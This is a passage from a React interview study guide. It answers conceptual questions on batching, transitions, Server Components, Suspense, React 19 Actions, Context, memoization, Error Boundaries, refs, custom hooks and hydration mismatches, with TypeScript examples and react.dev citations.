answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** State batching is the optimization where React groups multiple state update calls into a single re-render pass to prevent unnecessary intermediate DOM renders. In React 17 and earlier, batching only occurred within React-managed synthetic event handlers (like `onClick`). State updates inside native `setTimeout`, `fetch` callbacks, or `Promise.then` executed unbatched, triggering a separate re-render for every setter call. React 18 introduced Automatic Batching across all contexts via `createRoot`.

```tsx
function UserProfile() {
    const [name, setName] = useState('');
    const [role, setRole] = useState('');

    const handleClick = () => {
        fetch('/api/user').then(() => {
            // In React 17: Caused 2 separate renders!
            // In React 18+: Automatically batched into 1 single render!
            setName('Alice');
            setRole('Admin');
        });
    };

    // Opting out of batching when immediate synchronous DOM update is needed:
    const handleSync = () => {
        ReactDOM.flushSync(() => {
            setName('Bob'); // Flushes to DOM immediately
        });
        setRole('Editor');  // Flushed in next pass
    };
}
```

**Complexity analysis and mechanics:**
- **Performance gain:** Reduces N render passes to 1 render pass across asynchronous task micro-ticks.
- **Implementation:** React assigns identical priority lanes to state updates queued within the same microtask turn.

**Algorithmic mechanics and edge cases:**
If an application relies on reading the intermediate DOM immediately after a state setter (e.g. measuring scroll height before a second state change), automatic batching can alter timing. Wrapping the update in `ReactDOM.flushSync()` forces React to flush pending updates to the DOM synchronously.

## Why

Automatic batching cuts redundant render cycles across asynchronous API callbacks, improving application frame rates.

## Worked Case

Walkthrough scenario: An async search fetches results and status. In the fetch response: setItems(data) and setIsLoading(false) are called consecutively. In React 17, items rendered while loading was still true, causing a temporary flash of empty state. In React 18, both setters are batched into a single render pass, cleanly transitioning from loading spinner to populated list in one frame.

## Risk

Assuming the DOM has updated immediately after calling a state setter inside a Promise callback fails under automatic batching.

## Trade-off

Batching delays DOM mutation until the end of the microtask queue; flushSync is available when immediate DOM reads are required.

## Try This

Log renders in a component that updates two state variables inside a setTimeout and verify that React 18 renders only once.

## Follow-ups

### How can you opt out of automatic batching in React 18?

Wrap the state update in ReactDOM.flushSync(() => { setState(...) }), which forces React to flush updates to the DOM synchronously.

## Citations

- https://react.dev/blog/2022/03/29/react-v18#new-feature-automatic-batching
- https://react.dev/reference/react-dom/flushSync

# How do useTransition and useDeferredValue prioritize urgent user interactions over non-urgent background renders?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** React differentiates between **urgent updates** (direct user interactions like typing, clicking, dragging) which require instantaneous visual feedback, and **transition updates** (filtering lists, switching tabs, rendering charts) which users expect to take a brief moment. `useTransition` and `useDeferredValue` mark computations as non-urgent transitions, allowing React to interrupt them if an urgent event arrives during rendering.

```tsx
// 1. useTransition for state-updating functions:
function TabContainer() {
    const [tab, setTab] = useState('home');
    const [isPending, startTransition] = useTransition();

    const selectTab = (nextTab: string) => {
        startTransition(() => {
            setTab(nextTab); // Non-urgent: interruptible by clicks or typing
        });
    };
    return <div style={{ opacity: isPending ? 0.7 : 1 }}>...</div>;
}

// 2. useDeferredValue for consumer components receiving props:
function SearchResults({ query }: { query: string }) {
    const deferredQuery = useDeferredValue(query); // Lags behind urgent query
    const isStale = query !== deferredQuery;
    return <HeavyList query={deferredQuery} style={{ opacity: isStale ? 0.5 : 1 }} />;
}
```

**Complexity analysis and mechanics:**
- **Lane allocation:** Urgent updates receive `InputContinuousLane` or `SyncLane`; transitions receive `TransitionLane`.
- **Interruption mechanism:** If the user presses another key while `deferredQuery` is rendering, React aborts the in-progress render, processes the key press, and starts a fresh transition render with the latest value.

**Algorithmic mechanics and edge cases:**
Unlike debouncing or throttling (which introduce artificial fixed millisecond delays before work begins), transitions begin rendering *immediately* on fast hardware and only yield when slower devices experience thread contention, providing optimal responsiveness.

## Why

Transitions allow expensive computations to proceed immediately without freezing keystrokes or dropping input frames.

## Worked Case

Walkthrough scenario: An engineer implements a real-time code preview editor. When typing code, the input box updates state code. The AST parser and previewer use deferredCode = useDeferredValue(code). As the user types rapidly at 100 WPM, the text input updates at 60fps without lag. The AST preview interrupts itself repeatedly and commits only when typing pauses, keeping the main thread responsive.

## Risk

Using transitions for controlled form input values causes input lag and cursor jumping because keystrokes become delayed.

## Trade-off

Eliminates arbitrary setTimeout debounce timers while allowing UI to render intermediate stale states gracefully.

## Try This

Compare filtering 10,000 items with standard setState vs startTransition under 4x CPU throttling in Chrome DevTools.

## Follow-ups

### How do transitions differ fundamentally from setTimeout debouncing?

Debounce forces a fixed millisecond delay on all devices; transitions start computing immediately and yield only if actual user interaction occurs.

## Citations

- https://react.dev/reference/react/useTransition
- https://react.dev/reference/react/useDeferredValue

# How do React Server Components (RSC) differ from Server-Side Rendering (SSR) in bundle delivery and execution?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Server-Side Rendering (SSR) and React Server Components (RSC) solve fundamentally different problems:
- **SSR (Server-Side Rendering):** Renders the *initial HTML* of client components on the server for fast First Contentful Paint (FCP). Crucially, the entire JavaScript code for all components is still sent to the browser in the bundle so the client can *hydrate* (attach event listeners and build the Fiber tree).
- **RSC (React Server Components):** Executes *exclusively on the server*. RSCs have direct access to backend databases, microservices, and file systems. Their code and dependencies (e.g. Markdown parsers, database drivers) are *never included in the client JavaScript bundle* (zero bundle size impact). RSCs serialize to a compact JSON-like stream (RSC payload) that the client merges into its existing tree without losing client state.

```tsx
// Server Component (app/page.tsx - default in Next.js App Router):
import db from '@/lib/db'; // Never shipped to client bundle!
import { marked } from 'marked'; // 50KB library - 0KB client bundle!

export default async function ProductPage({ id }: { id: string }) {
    const product = await db.query('SELECT * FROM products WHERE id = ?', [id]);
    const html = marked(product.description);
    return (
        <div>
            <h1>{product.title}</h1>
            <div dangerouslySetInnerHTML={{ __html: html }} />
            {/* Client Component boundary */}
            <AddToCartButton productId={product.id} />
        </div>
    );
}
```

**Complexity analysis and mechanics:**
- **Client Bundle:** Server components contribute 0 bytes to the client JavaScript download.
- **Props Serialization:** Props passed across the Server-to-Client boundary (`'use client'`) must be serializable (primitives, plain objects, JSX); functions cannot be passed as props across the boundary.

**Algorithmic mechanics and edge cases:**
RSCs cannot use hooks (`useState`, `useEffect`) or browser DOM APIs (`window`, `localStorage`). When an RSC re-fetches on the server, it streams down its updated UI description without blowing away client state in `<AddToCartButton />`, preserving form inputs and scroll position.

## Why

RSCs reduce client bundle sizes to near zero while giving components secure, direct access to backend databases.

## Worked Case

Walkthrough scenario: An e-commerce product page uses heavy markdown and syntax highlighting packages (250KB total). In traditional SSR, all 250KB of JS must download and hydrate on the client. Migrating to React Server Components runs the markdown parsing exclusively on the server. The client downloads 0KB of parser JS, improving mobile page load times by over 1.5 seconds.

## Risk

Attempting to pass non-serializable values (functions, class instances) across the server-client boundary causes serialization crashes.

## Trade-off

Requires adopting framework routing boundaries ('use client' directives) and thinking in terms of server vs client execution environments.

## Try This

Inspect network tab in a Next.js App Router application and observe the streaming _rsc payload format containing serialized UI trees.

## Follow-ups

### Can a Client Component import a Server Component directly?

No, a Client Component cannot import a Server Component directly; however, it can accept a Server Component passed as a children prop.

## Citations

- https://react.dev/reference/rsc/server-components
- https://github.com/reactjs/rfcs/blob/main/text/0188-server-components.md

# How does Suspense coordinate asynchronous streaming and boundary fallbacks without rendering blank screens?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** `<Suspense>` is a declarative boundary mechanism that catches asynchronous promises thrown during rendering and displays a `fallback` UI until the promise resolves. When a component suspends (during data fetching, lazy loading, or streaming SSR), React halts rendering for that subtree, preserves the existing DOM, displays the specified fallback, and resumes rendering the suspended subtree once data arrives.

```tsx
import { Suspense, lazy } from 'react';
const UserAnalytics = lazy(() => import('./UserAnalytics'));

function Dashboard() {
    return (
        <div className="dashboard">
            <Header />
            {/* Boundary isolates analytics loading from the rest of the page */}
            <Suspense fallback={<div className="skeleton">Loading analytics...</div>}>
                <UserAnalytics />
            </Suspense>
            <Footer />
        </div>
    );
}
```

**Complexity analysis and mechanics:**
- **Streaming SSR:** In SSR, Suspense allows the server to send the outer page HTML immediately, and then stream chunked HTML for the suspended component over the same HTTP connection via `<template>` replacement.
- **Waterfalls elimination:** Nesting independent Suspense boundaries allows sibling components to stream in parallel as their data arrives, eliminating sequential waterfalls.

**Algorithmic mechanics and edge cases:**
When paired with transitions (`startTransition`), React prevents the UI from bouncing back to the fallback spinner on subsequent updates. Instead, React keeps the existing UI visible and interactive while loading the new screen in the background.

## Why

Suspense converts imperative loading state flags across hundreds of components into declarative layout boundaries.

## Worked Case

Walkthrough scenario: A dashboard contains UserProfile (fast, 50ms) and HeavyReport (slow, 2000ms). Without Suspense boundaries, SSR waits 2000ms before sending any HTML to the browser. Wrapping HeavyReport in <Suspense fallback={<Skeleton />}> streams the page layout and UserProfile in 50ms. The browser paints immediately, and the HeavyReport HTML streams into the DOM 2 seconds later.

## Risk

Placing a single top-level Suspense boundary around the entire app causes the whole screen to unmount into a spinner when any sub-component suspends.

## Trade-off

Requires data libraries compatible with React Suspense (e.g. TanStack Query or React Server Components) instead of raw useEffect fetch.

## Try This

Wrap a component using React.lazy in Suspense with a skeleton fallback and throttle network speed to observe fallback behavior.

## Follow-ups

### How does startTransition prevent Suspense from replacing visible UI with a fallback spinner?

startTransition tells React that the update is deferred; React leaves the current UI visible and interactive until the new suspended screen is completely ready.

## Citations

- https://react.dev/reference/react/Suspense
- https://react.dev/reference/react/lazy

# How do React 19 Actions, useActionState, and useOptimistic simplify form submissions and instant UI feedback?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** React 19 formalizes asynchronous state transitions initiated by user interactions into **Actions**. An Action is an async function that handles pending states, error boundaries, optimistic updates, and sequential submission. `useActionState` manages the action lifecycle, returning `[state, formAction, isPending]`. `useOptimistic` provides instant UI updates that automatically revert if the server action fails.

```tsx
import { useActionState, useOptimistic } from 'react';

async function updateNameAction(prevState: string, formData: FormData) {
    const newName = formData.get('name') as string;
    await api.updateName(newName); // Server request
    return newName;
}

function ProfileEditor({ currentName }: { currentName: string }) {
    const [state, formAction, isPending] = useActionState(updateNameAction, currentName);
    const [optimisticName, setOptimisticName] = useOptimistic(
        state,
        (current, update: string) => update
    );

    const handleSubmit = async (formData: FormData) => {
        const next = formData.get('name') as string;
        setOptimisticName(next); // Instant UI feedback!
        await formAction(formData);
    };

    return (
        <form action={handleSubmit}>
            <p>Welcome, {optimisticName} {isPending && '(Saving...)'}</p>
            <input name="name" defaultValue={state} />
            <button disabled={isPending}>Save</button>
        </form>
    );
}
```

**Complexity analysis and mechanics:**
- **Optimistic rollback:** If `formAction` rejects, `useOptimistic` discards the optimistic update automatically on the next render pass.
- **Progressive enhancement:** When paired with Server Actions, `<form action={formAction}>` functions even before client JavaScript hydrates.

**Algorithmic mechanics and edge cases:**
Prior to React 19, developers wrote dozens of lines managing `isLoading`, `error`, `isSubmitting`, and manual rollback snapshots. Actions natively serialize requests, queue concurrent submissions, and reset inputs on successful completion.

## Why

Actions standardize async form flows, automatic pending states, and optimistic rollbacks with declarative primitives.

## Worked Case

Walkthrough scenario: A user likes a comment. With useOptimistic, the like icon turns red and the count increments from 4 to 5 in 0ms. If the backend mutation times out or returns 500 error, React catches the exception in useActionState and immediately reverts the like icon to grey and count back to 4, displaying an error toast without manual state reversal code.

## Risk

Mutating complex state optimistically without handling partial validation errors can display inconsistent intermediate UI.

## Trade-off

Replaces legacy manual useState/useEffect form handling with React 19 native action lifecycles.

## Try This

Submit a form with useOptimistic and simulate a network failure to observe the automatic rollback to previous state.

## Follow-ups

### What was the previous name of useActionState during React 19 canary releases?

useActionState was previously named useFormState before being generalized to handle any asynchronous action beyond forms.

## Citations

- https://react.dev/reference/react/useActionState
- https://react.dev/reference/react/useOptimistic

# Why can React Context cause unnecessary re-renders across consumers, and how do you optimize or split contexts?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** React Context is designed for low-frequency global updates (such as current user, theme, or locale). When a Context Provider's `value` prop changes reference, *every single component that calls `useContext(MyContext)` re-renders*, even if the component only consumes a property that did not change. `React.memo` on consumer components cannot prevent this because Context subscriptions bypass `React.memo` bailout checks entirely.

```tsx
// PROBLEMATIC: Monolithic context holding fast and slow state
const AppContext = createContext<{ user: User; count: number }>({} as any);
// Any increment to 'count' re-renders components that only care about 'user'!

// SOLUTION 1: Context Splitting (Separate dynamic state from static data)
const UserContext = createContext<User | null>(null);
const CountContext = createContext<number>(0);

// SOLUTION 2: Separate State and Dispatch Contexts
const TodoStateContext = createContext<Todo[]>([]);
const TodoDispatchContext = createContext<Dispatch<TodoAction>>(() => {});
// Components that only dispatch actions never re-render when todos change!

// SOLUTION 3: Custom Selector Hook with useSyncExternalStore
function useUser() {
    const user = useContext(UserContext);
    if (!user) throw new Error('useUser must be used within UserProvider');
    return user;
}
```

**Complexity analysis and mechanics:**
- **Propagation:** O(c) where c is the number of subscribed consumer Fibers, traversing subscriber lists directly.
- **Bailout failure:** `React.memo` only bails out when props and internal state are unchanged; it explicitly does not bail out for Context changes.

**Algorithmic mechanics and edge cases:**
Always memoize the `value` passed to `<MyContext.Provider value={useMemo(() => ({ data }), [data])}>`. If the value is an inline object literal, every render of the Provider creates a new object reference, triggering cascading re-renders across all consumers.

## Why

Context splitting separates high-frequency mutations from static data, stopping cascading re-render bottlenecks.

## Worked Case

Walkthrough scenario: A dashboard contains 50 components reading user profile from a monolithic context that also stores an unreadNotificationCount updated every 5 seconds. Every notification poll causes all 50 profile cards to re-render. Splitting into UserContext and NotificationContext isolates notification updates to the badge component, eliminating 49 redundant re-renders.

## Risk

Passing inline unmemoized object literals to Context.Provider triggers full-tree consumer re-renders on every parent render.

## Trade-off

Splitting contexts creates multiple provider wrappers in component trees; alternatively, external stores (Zustand) support selectors.

## Try This

Profile a component using React DevTools Highlight Updates when updating an unconsumed field in a shared context.

## Follow-ups

### How do external state libraries like Zustand or Redux solve the context re-render issue?

They use useSyncExternalStore with selector functions (useStore(s => s.user)), ensuring components re-render only when the selected slice changes equality.

## Citations

- https://react.dev/reference/react/useContext#optimizing-re-renders-when-passing-objects-and-functions
- https://react.dev/learn/scaling-up-with-reducer-and-context

# How does memoization with React.memo, useMemo, and useCallback actually work, and when does it degrade performance?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Memoization in React caches previous results to avoid repeated computations across renders:
- **`React.memo(Component)`:** A Higher-Order Component that performs a shallow comparison (`Object.is`) of previous and incoming props. If all props are identical, React bails out of re-rendering the component and its children.
- **`useMemo(() => compute(), [deps])`:** Caches the *result* of an expensive calculation between renders.
- **`useCallback(fn, [deps])`:** Caches the *function definition instance* between renders, preventing new function references from breaking shallow equality in children wrapped with `React.memo`.

```tsx
// Pure Child memoized against prop changes:
const ExpensiveList = React.memo(function ExpensiveList({ items, onItemClick }: {
    items: string[];
    onItemClick: (item: string) => void;
}) {
    return <ul>{items.map(i => <li key={i} onClick={() => onItemClick(i)}>{i}</li>)}</ul>;
});

function Parent() {
    const [count, setCount] = useState(0);
    const [rawItems] = useState(['A', 'B', 'C']);

    // 1. useMemo caches heavy sorting:
    const items = useMemo(() => [...rawItems].sort(), [rawItems]);

    // 2. useCallback preserves reference equality of handler:
    const handleClick = useCallback((item: string) => {
        console.log(item);
    }, []);

    // Clicking count does NOT re-render ExpensiveList!
    return (
        <div>
            <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>
            <ExpensiveList items={items} onItemClick={handleClick} />
        </div>
    );
}
```

**Complexity analysis and mechanics:**
- **Shallow comparison:** O(P) comparison of prop keys via `Object.is`.
- **When memoization degrades performance:** Wrapping trivial calculations (e.g. `useMemo(() => a + b, [a, b])`) is slower than recalculating because allocating dependency arrays and executing comparison checks costs more CPU cycles than simple scalar math.

## Why

useCallback is only effective when passed to components optimized with React.memo or used in effect dependency arrays.

## Worked Case

Walkthrough scenario: A parent component re-renders on every mouse move. It renders a 2,000-node virtualized grid. Without memoization, passing onClick={() => alert(1)} creates a fresh function reference every mouse move, forcing the entire grid to re-render and lagging to 15fps. Wrapping the grid in React.memo and the callback in useCallback restores steady 60fps rendering.

## Risk

Applying useCallback without React.memo on the child adds closure allocation overhead with zero re-render prevention.

## Trade-off

Trading memory and comparison overhead for saved render cycles; profile with React DevTools before blindly memoizing.

## Try This

Measure execution time of a trivial calculation wrapped in useMemo vs unwrapped across 10,000 renders.

## Follow-ups

### What is the primary purpose of the React Compiler (React Forget)?

To automatically analyze code semantics and inject fine-grained memoization at compile time, eliminating the need for manual useMemo, useCallback, and React.memo.

## Citations

- https://react.dev/reference/react/memo
- https://react.dev/reference/react/useCallback

# How do Error Boundaries capture rendering errors, and why can they not catch async or event handler failures?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** An Error Boundary is a React class component that implements `static getDerivedStateFromError(error)` and/or `componentDidCatch(error, info)`. It catches JavaScript exceptions thrown anywhere in its child component tree during **rendering, lifecycle methods, and constructors**, logging the error and displaying a declarative fallback UI rather than crashing the entire React application into a blank white screen.

```tsx
import React, { Component, ErrorInfo, ReactNode } from 'react';

interface Props { children: ReactNode; fallback: ReactNode; }
interface State { hasError: boolean; }

export class ErrorBoundary extends Component<Props, State> {
    state: State = { hasError: false };

    static getDerivedStateFromError(_: Error): State {
        // Render fallback UI on next pass
        return { hasError: true };
    }

    componentDidCatch(error: Error, info: ErrorInfo) {
        console.error('Captured in ErrorBoundary:', error, info.componentStack);
    }

    render() {
        if (this.state.hasError) return this.props.fallback;
        return this.props.children;
    }
}
```

**Complexity analysis and mechanics:**
- **Catch boundary scope:** Intercepts errors during the Render and Commit phases of children components.
- **Why async and event handlers are NOT caught:** Event handlers (`onClick`) and asynchronous callbacks (`fetch`, `setTimeout`) execute *outside* the React rendering loop on the browser's event queue. Because React is not actively rendering when an event handler throws, Error Boundaries cannot catch them.

**Algorithmic mechanics and edge cases:**
To catch errors from event handlers or async promises in an Error Boundary, trigger a state update during render: `const [_, setError] = useState(); const handleError = (e) => setError(() => { throw e; });`.

## Why

Error boundaries isolate sub-tree crashes (e.g. an ad widget or feed card) so the rest of the application remains functional.

## Worked Case

Walkthrough scenario: A financial trading dashboard has three widgets: StockChart, OrderBook, and NewsFeed. NewsFeed receives malformed JSON and throws a TypeError reading undefined. Without an ErrorBoundary, React unmounts the entire root component, crashing the trader's view. Wrapping NewsFeed in <ErrorBoundary fallback={<p>News unavailable</p>}> displays the fallback while StockChart and OrderBook continue updating normally.

## Risk

Relying solely on Error Boundaries to catch async network errors fails because async exceptions bypass the render cycle.

## Trade-off

Must be implemented as class components in React 18/19 (or via third-party react-error-boundary package).

## Try This

Throw an error inside a component's render body vs inside an onClick handler and observe which one Error Boundary catches.

## Follow-ups

### How do you handle errors inside async event handlers in React?

Use standard try/catch blocks within the event handler and set component error state, or re-throw inside a state updater to propagate to an Error Boundary.

## Citations

- https://react.dev/reference/react/Component#catching-rendering-errors-with-an-error-boundary
- https://github.com/bvaughn/react-error-boundary

# When and why should you use useRef instead of useState, and how does it prevent infinite render loops?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Both `useState` and `useRef` persist values across component re-renders. However:
- `useState` is for data that **influences the visual output**. Updating state schedules a component re-render.
- `useRef` returns a mutable object `{ current: initialValue }` for data that **must not trigger a re-render** when changed. Mutating `.current` updates the value synchronously without queuing a render pass.

```tsx
function Stopwatch() {
    const [seconds, setSeconds] = useState(0);
    // useRef stores timer ID without triggering re-render on assignment:
    const timerRef = useRef<number | null>(null);
    // useRef stores direct DOM reference:
    const inputRef = useRef<HTMLInputElement>(null);

    const handleStart = () => {
        if (timerRef.current !== null) return;
        timerRef.current = window.setInterval(() => {
            setSeconds(s => s + 1);
        }, 1000);
    };

    const handleStop = () => {
        if (timerRef.current !== null) {
            clearInterval(timerRef.current);
            timerRef.current = null;
        }
    };

    return (
        <div>
            <p>Time: {seconds}s</p>
            <button onClick={handleStart}>Start</button>
            <button onClick={handleStop}>Stop</button>
            <input ref={inputRef} />
        </div>
    );
}
```

**Complexity analysis and mechanics:**
- **Reference stability:** The object returned by `useRef` retains strict identity (`refA === refB`) across every render.
- **Infinite loop prevention:** Modifying `ref.current` inside `useEffect` does NOT cause the effect to re-trigger, whereas calling `setState` inside `useEffect` without guards creates infinite render loops.

**Algorithmic mechanics and edge cases:**
Do not read or write `ref.current` during the component's render body (except for lazy initialization). The Render Phase can be called multiple times or aborted by Concurrent React; mutating refs during rendering introduces side effects that break pure rendering rules.

## Why

useRef stores mutable instance variables and DOM references without incurring the performance penalty of re-rendering.

## Worked Case

Walkthrough scenario: An engineer tracks the previous value of a prop. Storing previousValue in useState and updating it in useEffect triggers an extra render on every prop change. Refactoring to prevRef = useRef(); useEffect(() => { prevRef.current = value; }) stores the historical value synchronously without triggering a secondary render cycle.

## Risk

Mutating ref.current during rendering introduces nondeterministic bugs under React Concurrent Mode.

## Trade-off

Changes to ref.current are not reflected in JSX until some other state change triggers a component re-render.

## Try This

Replace a timer ID stored in useState with useRef and verify that assigning the timer ID causes zero unnecessary re-renders.

## Follow-ups

### Why is it unsafe to read or write ref.current directly in the component render body?

Render functions must be pure. Concurrent React can render a component, discard the result, and re-render later; mutating refs during render leads to inconsistent state.

## Citations

- https://react.dev/reference/react/useRef
- https://react.dev/learn/referencing-values-with-refs

# How do custom hooks encapsulate stateful logic without sharing physical state between component instances?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A custom hook is a standard JavaScript function whose name starts with `use` and that can call other React hooks. Crucially, custom hooks **share stateful logic, not state itself**. Each time a component calls a custom hook, React instantiates a completely independent set of state cells on that specific component's Fiber node. Two components calling `useWindowSize()` have completely isolated state instances.

```tsx
import { useState, useEffect } from 'react';

// Custom Hook encapsulating resize listener:
export function useWindowSize() {
    const [size, setSize] = useState({ width: window.innerWidth, height: window.innerHeight });

    useEffect(() => {
        const handleResize = () => setSize({ width: window.innerWidth, height: window.innerHeight });
        window.addEventListener('resize', handleResize);
        return () => window.removeEventListener('resize', handleResize);
    }, []);

    return size;
}

// Two independent components using the custom hook:
function Header() {
    const { width } = useWindowSize(); // Own state cell!
    return <header>{width < 768 ? 'Mobile Menu' : 'Desktop Nav'}</header>;
}
function Sidebar() {
    const { width } = useWindowSize(); // Completely separate state cell!
    return <aside>{width < 1024 ? 'Collapsed' : 'Expanded'}</aside>;
}
```

**Complexity analysis and mechanics:**
- **Inlining mechanism:** When a component calls a custom hook, React treats the hook's internal `useState` and `useEffect` calls as if they were written directly inside the calling component's body.
- **Return value:** Can return any data structure (tuple, object, scalar) tailored to the consumer.

**Algorithmic mechanics and edge cases:**
To share physical singleton state between components, a custom hook must subscribe to an external store (e.g. via `useSyncExternalStore`) or consume a shared React Context.

## Why

Custom hooks extract repetitive asynchronous and DOM subscriptions into composable, testable units.

## Worked Case

Walkthrough scenario: Three separate components require geolocation tracking. Instead of copying navigator.geolocation API calls and event handlers into all three components, the team writes useGeolocation(). Each component gains typed { coords, error } state. When Component A unmounts, its cleanup clears its watchPosition watcher without impacting Component B.

## Risk

Assuming that updating state in a custom hook in one component automatically updates another component calling the same hook.

## Trade-off

Promotes modular code reusability but can hide complex dependency graphs from developers reading component JSX.

## Try This

Write a useDebounce(value, delay) custom hook and verify that using it in two inputs maintains independent debounced values.

## Follow-ups

### How do you share actual state (single source of truth) across multiple components using a custom hook?

Pair the custom hook with React Context or an external store (Zustand, useSyncExternalStore), having the hook consume the shared context or store subscription.

## Citations

- https://react.dev/learn/reusing-logic-with-custom-hooks
- https://react.dev/reference/rules/rules-of-hooks

# How do forwardRef and useImperativeHandle expose controlled imperative methods to parent components?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** By default, React components are black boxes that do not expose their internal DOM nodes or state to parent components. `forwardRef` allows a component to receive a `ref` from its parent and forward it down to a child DOM node. `useImperativeHandle` customizes the ref instance exposed to the parent, preventing the parent from accessing the raw DOM element and exposing only an intentional, controlled set of imperative methods (such as `focus()`, `reset()`, or `scrollIntoView()`).

```tsx
import React, { forwardRef, useImperativeHandle, useRef } from 'react';

// 1. Define the imperative handle interface:
export interface CustomInputHandle {
    focus: () => void;
    clear: () => void;
}

// 2. Child component wrapping with forwardRef and useImperativeHandle:
export const CustomInput = forwardRef<CustomInputHandle, { label: string }>((props, ref) => {
    const internalInputRef = useRef<HTMLInputElement>(null);

    useImperativeHandle(ref, () => ({
        focus: () => internalInputRef.current?.focus(),
        clear: () => { if (internalInputRef.current) internalInputRef.current.value = ''; }
    }), []);

    return <input ref={internalInputRef} placeholder={props.label} />;
});

// 3. Parent invoking controlled methods:
function ParentForm() {
    const inputHandleRef = useRef<CustomInputHandle>(null);
    return (
        <div>
            <CustomInput ref={inputHandleRef} label="Username" />
            <button onClick={() => inputHandleRef.current?.focus()}>Focus</button>
            <button onClick={() => inputHandleRef.current?.clear()}>Clear</button>
        </div>
    );
}
```

**Complexity analysis and mechanics:**
- **Encapsulation boundary:** Parent cannot access internal input attributes like `style`, `className`, or `parentNode`.
- **React 19 improvement:** In React 19, `ref` is passed as a standard prop, making `forwardRef` deprecated in favor of direct `ref` prop passing.

**Algorithmic mechanics and edge cases:**
Use imperative handles sparingly. Declarative prop passing should handle 95% of React interactions; reserve imperative handles for focus management, media playback (`play()`, `pause()`), animations, and imperative canvas interactions.

## Why

useImperativeHandle protects component encapsulation by exposing only safe, specific methods to parents rather than raw DOM nodes.

## Worked Case

Walkthrough scenario: A design system exposes a VideoPlayer component. If the raw <video> tag is forwarded, the parent can arbitrarily modify video.src or delete event listeners. Using useImperativeHandle, VideoPlayer exposes only { play(), pause(), seek(time) }, preserving internal state invariants while providing the parent with necessary playback controls.

## Risk

Overusing imperative refs creates brittle, imperative codebases that bypass React's declarative unidirectional data flow.

## Trade-off

Provides controlled escape hatches for focus and media playback at the expense of adding imperative mental models.

## Try This

Expose a scrollToBottom() method on a chat log component using useImperativeHandle and trigger it from a parent send button.

## Follow-ups

### How does React 19 change the way refs are passed to functional components?

React 19 treats ref as a regular prop in function components (<MyComponent ref={myRef} />), eliminating the need for forwardRef wrapper boilerplate.

## Citations

- https://react.dev/reference/react/useImperativeHandle
- https://react.dev/reference/react/forwardRef

# What causes hydration mismatches in server-rendered React applications, and how do you diagnose and fix them?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A hydration mismatch occurs in Server-Side Rendered (SSR) React applications when the initial HTML markup generated on the server differs from the virtual DOM tree generated during the client's initial render pass. When React hydrates, it walks the existing DOM nodes and expects attributes, tag types, and text content to match identically. If a mismatch is detected, React emits console warnings, discards matching optimizations, and can cause visual bugs or crash with fatal hydration errors.

```tsx
// COMMON CAUSES OF HYDRATION MISMATCHES:
// 1. Browser-only APIs (window, localStorage) during render:
function BadComponent() {
    // On server: typeof window is 'undefined' -> renders 'Guest'
    // On client: localStorage has token -> renders 'Alice' -> MISMATCH!
    const user = typeof window !== 'undefined' ? localStorage.getItem('user') : 'Guest';
    return <div>User: {user}</div>;
}

// 2. Dates, Timestamps, and Math.random():
// Server renders in UTC timezone; Client renders in PST timezone -> MISMATCH!
function BadDate() { return <div>{new Date().toLocaleTimeString()}</div>; }

// 3. Invalid HTML nesting (e.g. <p> containing <div> or <table> without <tbody>)
// Browser auto-corrects invalid HTML DOM, breaking React's matching expectations!

// RESOLUTION: Two-Pass Rendering Pattern with useEffect
function SafeClientComponent() {
    const [isClient, setIsClient] = useState(false);
    useEffect(() => { setIsClient(true); }, []);

    return <div>User: {isClient ? localStorage.getItem('user') : 'Guest'}</div>;
}
```

**Complexity analysis and mechanics:**
- **Hydration repair:** In React 18+, React attempts to recover from single-element mismatches by patching client attributes, but severe structural mismatches force client re-rendering of entire subtrees.
- **suppressHydrationWarning:** For unavoidable differences (like server vs client timestamps), adding `suppressHydrationWarning={true}` silences warnings for that specific text element.

**Algorithmic mechanics and edge cases:**
Browser extensions (password managers, dark mode extensions) that inject arbitrary DOM nodes before React hydrates frequently trigger hydration errors. Ensure hydration runs on clean root elements without extension injection.

## Why

Fixing hydration mismatches guarantees seamless handover from static HTML to interactive React without visual flashing.

## Worked Case

Walkthrough scenario: An application renders current user timezone in the header. The server runs in UTC and renders '14:00 UTC', while the user's browser in New York renders '10:00 AM EST'. React emits Warning: Text content did not match. The team refactors to format timestamps in useEffect or uses a fixed UTC display on first paint, resolving the mismatch warning.

## Risk

Hydration mismatches degrade performance by forcing React to discard server-rendered DOM and re-render subtrees on the client.

## Trade-off

Two-pass rendering ensures hydration safety but delays rendering client-specific data until after the initial paint.

## Try This

Render new Date().toLocaleTimeString() in an SSR component and inspect the resulting hydration mismatch warning in the browser console.

## Follow-ups

### What does the suppressHydrationWarning prop do on a React element?

